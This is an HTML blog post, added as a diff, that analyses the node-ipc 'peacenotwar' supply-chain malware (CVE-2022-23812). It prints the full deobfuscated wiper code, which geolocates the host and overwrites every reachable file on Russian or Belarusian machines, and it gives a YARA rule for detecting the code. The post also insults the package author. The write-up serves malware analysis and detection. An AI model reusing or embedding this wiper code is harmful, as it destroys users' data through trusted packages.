@@ -1,0 +1,199 @@
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="description" content="quackland.tk - under construction">
+	<meta name="author" content="quackland.tk">
+	<link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="styles/dracula.css">
+	<script src="js/highlight.pack.js"></script>
+	<script>hljs.highlightAll();</script>
+	<title>quackland.kr</title>
+	</head>
+	<body><h1 id="node-ipc-developers-deploys-supply-chain-attack">Node-IPC developers deploys Supply Chain Attack</h1>
+<p>Brandon Charles Miller aka <code>RIAEvangelist</code> author of <a href="https://github.com/RIAEvangelist/node-ipc">node-ipc</a> which a dependency in popular open source projects such as <a href="https://vuejs.org/">vue js</a>, <a href="https://www.npmjs.com/package/@playlyfe/gql">gql</a>, <a href="https://www.npmjs.com/browse/depended/node-ipc">etc.</a> deployed a malware that deletes all the files present on the machine if machine is found to be using a Russian or Belarus IP.</p>
+<p>This supply chain attack was deployed in order to show support for Ukraine by (American citizen) Brandon Charles Miller. As expected the open source community backlashes at the author for such a reckless and dick move.</p>
+<h2 id="affected">Affected</h2>
+<p><img src="images/american_ngo.png" /></p>
+<h2 id="analysis-of-the-malware">Analysis of the Malware</h2>
+<p>The supply chain attack that occurred is assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23812">CVE-2022-23812</a> and the vulnerable versions i.e. <code>10.1.1</code> and <code>10.1.2</code> are removed from GitHub as well as NPM website.</p>
+<p>More specifically commits from <code>847047cf7f81ab08352038b2204f0e7633449580</code> to <code>6e344066a0464814a27fbd7ca8422f473956a803</code> contains the traces of malware that is used to delete files on the machine.</p>
+<p>The file called <a href="https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js">geospec.js</a> contains the obfuscated snippet of the JS malware.</p>
+<p><img src="images/obfuscated_js.png" /></p>
+<p>Prettifying it.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> u <span class="im">from</span> <span class="st">&quot;path&quot;</span><span class="op">;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> a <span class="im">from</span> <span class="st">&quot;fs&quot;</span><span class="op">;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> o <span class="im">from</span> <span class="st">&quot;https&quot;</span><span class="op">;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="pp">setTimeout</span>(<span class="kw">function</span>() {</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> t <span class="op">=</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">round</span>(<span class="bu">Math</span><span class="op">.</span><span class="fu">random</span>() <span class="op">*</span> <span class="dv">4</span>)<span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (t <span class="op">&gt;</span> <span class="dv">1</span>) {</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> n <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>    o<span class="op">.</span><span class="fu">get</span>(n<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>)<span class="op">,</span> <span class="kw">function</span>(t) {</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>        t<span class="op">.</span><span class="fu">on</span>(<span class="st">&quot;data&quot;</span><span class="op">,</span> <span class="kw">function</span>(t) {</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> n <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;Li8=&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> o <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;Li4v&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> r <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;Li4vLi4v&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> f <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;Lw==&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> c <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;Y291bnRyeV9uYW1l&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> e <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;cnVzc2lh&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> i <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;YmVsYXJ1cw==&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> {</span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>                <span class="kw">const</span> s <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">parse</span>(t<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>                <span class="kw">const</span> u <span class="op">=</span> s[c<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>)]<span class="op">.</span><span class="fu">toLowerCase</span>()<span class="op">;</span></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a>                <span class="kw">const</span> a <span class="op">=</span> u<span class="op">.</span><span class="fu">includes</span>(e<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>)) <span class="op">||</span> u<span class="op">.</span><span class="fu">includes</span>(i<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> (a) {</span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">h</span>(n<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">h</span>(o<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">h</span>(r<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">h</span>(f<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))</span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>                }</span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">catch</span> (t) {}</span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>        })</span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a>    })</span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a>}<span class="op">,</span> <span class="bu">Math</span><span class="op">.</span><span class="fu">ceil</span>(<span class="bu">Math</span><span class="op">.</span><span class="fu">random</span>() <span class="op">*</span> <span class="fl">1e3</span>))<span class="op">;</span></span>
+<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">h</span>(n <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">,</span> o <span class="op">=</span> <span class="st">&quot;&quot;</span>) {</span>
+<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="op">!</span>a<span class="op">.</span><span class="fu">existsSync</span>(n)) {</span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span></span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> r <span class="op">=</span> []<span class="op">;</span></span>
+<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span> {</span>
+<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a>        r <span class="op">=</span> a<span class="op">.</span><span class="fu">readdirSync</span>(n)</span>
+<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">catch</span> (t) {}</span>
+<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> f <span class="op">=</span> []<span class="op">;</span></span>
+<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> c <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="st">&quot;4p2k77iP&quot;</span><span class="op">,</span> <span class="st">&quot;base64&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">var</span> e <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> e <span class="op">&lt;</span> r<span class="op">.</span><span class="at">length</span><span class="op">;</span> e<span class="op">++</span>) {</span>
+<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> i <span class="op">=</span> u<span class="op">.</span><span class="fu">join</span>(n<span class="op">,</span> r[e])<span class="op">;</span></span>
+<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> t <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> {</span>
+<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a>            t <span class="op">=</span> a<span class="op">.</span><span class="fu">lstatSync</span>(i)</span>
+<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">catch</span> (t) {</span>
+<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a>            <span class="cf">continue</span></span>
+<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (t<span class="op">.</span><span class="fu">isDirectory</span>()) {</span>
+<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> s <span class="op">=</span> <span class="fu">h</span>(i<span class="op">,</span> o)<span class="op">;</span></span>
+<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a>            s<span class="op">.</span><span class="at">length</span> <span class="op">&gt;</span> <span class="dv">0</span> <span class="op">?</span> f<span class="op">.</span><span class="fu">push</span>(<span class="op">...</span>s) <span class="op">:</span> <span class="kw">null</span></span>
+<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">else</span> <span class="cf">if</span> (i<span class="op">.</span><span class="fu">indexOf</span>(o) <span class="op">&gt;=</span> <span class="dv">0</span>) {</span>
+<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> {</span>
+<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a>                a<span class="op">.</span><span class="fu">writeFile</span>(i<span class="op">,</span> c<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>)<span class="op">,</span> <span class="kw">function</span>() {})</span>
+<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">catch</span> (t) {}</span>
+<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> f</span>
+<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span>
+<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> ssl <span class="op">=</span> <span class="kw">true</span><span class="op">;</span></span>
+<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a><span class="im">export</span> {</span>
+<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a>    ssl <span class="im">as</span></span>
+<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a>    <span class="im">default</span><span class="op">,</span> ssl</span>
+<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<h3 id="fetching-ip">Fetching IP</h3>
+<p>Since the malware is Geo targeted the first issue of business is to get IP address. For this malware decodes a base64 string which contains <code>api.ipgeolocation.io</code> service along with the API key.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode s"><code class="sourceCode gnuassembler"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">https:</span><span class="op">//</span>api.ipgeolocation.io<span class="op">/</span>ipgeo<span class="op">?</span>apiKey<span class="op">=</span>ae511e1627824a968aaaa758a5309154⏎</span></code></pre></div>
+<p>Once that is done, <code>https</code> module that was imported is used to check if IP originates to countries Russia or Belarus.</p>
+<p>If that is comes out to be true function <code>h</code> is called with parameters <code>n</code>,<code>o</code>,<code>r</code>,<code>f</code>.</p>
+<table>
+<thead>
+<tr class="header">
+<th>Variable</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>n</td>
+<td><code>./</code></td>
+</tr>
+<tr class="even">
+<td>o</td>
+<td><code>../</code></td>
+</tr>
+<tr class="odd">
+<td>r</td>
+<td><code>../../</code></td>
+</tr>
+<tr class="even">
+<td>f</td>
+<td><code>/</code></td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb3"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>o<span class="op">.</span><span class="fu">get</span>(n<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>)<span class="op">,</span> <span class="kw">function</span>(t) {</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>        t<span class="op">.</span><span class="fu">on</span>(<span class="st">&quot;data&quot;</span><span class="op">,</span> <span class="kw">function</span>(t) {</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> n <span class="op">=</span> <span class="st">&quot;./&quot;</span><span class="op">;</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> o <span class="op">=</span> <span class="st">&quot;../&quot;</span><span class="op">;</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> r <span class="op">=</span> <span class="st">&quot;../../&quot;</span><span class="op">;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> f <span class="op">=</span> <span class="st">&quot;/&quot;</span><span class="op">;</span></span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> c <span class="op">=</span> <span class="st">&quot;country_name&quot;</span><span class="op">;</span></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> e <span class="op">=</span> <span class="st">&quot;russia&quot;</span><span class="op">;</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> i <span class="op">=</span> <span class="st">&quot;belarus&quot;</span><span class="op">;</span></span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> {</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>                <span class="kw">const</span> s <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">parse</span>(t<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>                <span class="kw">const</span> u <span class="op">=</span> s[c<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>)]<span class="op">.</span><span class="fu">toLowerCase</span>()<span class="op">;</span></span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>                <span class="kw">const</span> a <span class="op">=</span> u<span class="op">.</span><span class="fu">includes</span>(e<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>)) <span class="op">||</span> u<span class="op">.</span><span class="fu">includes</span>(i<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> (a) {</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">h</span>(n<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">h</span>(o<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">h</span>(r<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))<span class="op">;</span></span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>                    <span class="fu">h</span>(f<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>))</span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>                }</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">catch</span> (t) {}</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>        })</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>    })</span></code></pre></div>
+<h3 id="deleting-files">Deleting Files</h3>
+<p>Once the country (via IP geolocation) is identified all that remains is to delete files. For this function called <code>h</code> is used.</p>
+<p>All this function does is make use of import called <code>a</code> i.e. the <code>fs</code> module and read all the files present in the directory recursively and overwrite them with emoji ❤️.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">async</span> <span class="kw">function</span> <span class="fu">h</span>(n <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">,</span> o <span class="op">=</span> <span class="st">&quot;&quot;</span>) {</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="op">!</span>a<span class="op">.</span><span class="fu">existsSync</span>(n)) {</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> r <span class="op">=</span> []<span class="op">;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span> {</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>        r <span class="op">=</span> a<span class="op">.</span><span class="fu">readdirSync</span>(n)</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">catch</span> (t) {}</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> f <span class="op">=</span> []<span class="op">;</span></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> c <span class="op">=</span> <span class="st">&quot;❤️&quot;</span><span class="op">;</span></span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">var</span> e <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> e <span class="op">&lt;</span> r<span class="op">.</span><span class="at">length</span><span class="op">;</span> e<span class="op">++</span>) {</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> i <span class="op">=</span> u<span class="op">.</span><span class="fu">join</span>(n<span class="op">,</span> r[e])<span class="op">;</span></span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> t <span class="op">=</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> {</span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>            t <span class="op">=</span> a<span class="op">.</span><span class="fu">lstatSync</span>(i)</span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">catch</span> (t) {</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>            <span class="cf">continue</span></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (t<span class="op">.</span><span class="fu">isDirectory</span>()) {</span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>            <span class="kw">const</span> s <span class="op">=</span> <span class="fu">h</span>(i<span class="op">,</span> o)<span class="op">;</span></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>            s<span class="op">.</span><span class="at">length</span> <span class="op">&gt;</span> <span class="dv">0</span> <span class="op">?</span> f<span class="op">.</span><span class="fu">push</span>(<span class="op">...</span>s) <span class="op">:</span> <span class="kw">null</span></span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">else</span> <span class="cf">if</span> (i<span class="op">.</span><span class="fu">indexOf</span>(o) <span class="op">&gt;=</span> <span class="dv">0</span>) {</span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span> {</span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a>                a<span class="op">.</span><span class="fu">writeFile</span>(i<span class="op">,</span> c<span class="op">.</span><span class="fu">toString</span>(<span class="st">&quot;utf8&quot;</span>)<span class="op">,</span> <span class="kw">function</span>() {})</span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a>            } <span class="cf">catch</span> (t) {}</span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> f</span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span></code></pre></div>
+<p>The malware is basically a bad written version of data wipe or ransomware attack. The code what an amateur hacker would write in intro pentest class.</p>
+<h2 id="yara-rule">Yara Rule</h2>
+<div class="sourceCode" id="cb5"><pre class="sourceCode s"><code class="sourceCode gnuassembler"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>rule peacenotwar_malware <span class="op">{</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>        <span class="fu">meta:</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>                description <span class="op">=</span> <span class="st">&quot;detects CVE-2022-23812 PEACENOTWAR NPM SUPPY CHAIN ATTACK&quot;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>                author <span class="op">=</span> <span class="st">&quot;duckie&quot;</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        <span class="fu">strings:</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>                $base64_string <span class="op">=</span> <span class="st">&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>                $russia_check <span class="op">=</span> <span class="st">&quot;cnVzc2lh&quot;</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>                $belarus_check <span class="op">=</span> <span class="st">&quot;YmVsYXJ1cw&quot;</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>                $over_write_string <span class="op">=</span> <span class="st">&quot;a.writeFile(i, c.toString(</span><span class="sc">\&quot;</span><span class="st">utf8</span><span class="sc">\&quot;</span><span class="st">), function() {}&quot;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>        <span class="fu">condition:</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>                any of them</span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<h2 id="further">Further</h2>
+<p><a href="https://github.com/RIAEvangelist">RIAEvangelist</a> maintains few other NPM repos too, try to avoid them. He has gone redditard now and there is no coming back.</p>
+<h2 id="links">Links</h2>
+<ul>
+<li>https://github.com/RIAEvangelist/node-ipc/blob/847047cf7f81ab08352038b2204f0e7633449580/dao/ssl-geospec.js</li>
+<li>https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c?permalink_comment_id=4101202</li>
+<li>https://github.com/RIAEvangelist/node-ipc/issues/472</li>
+<li>https://github.com/RIAEvangelist/node-ipc/issues (shitpost here to show protest, lol)</li>
+</ul></body>
+</html>
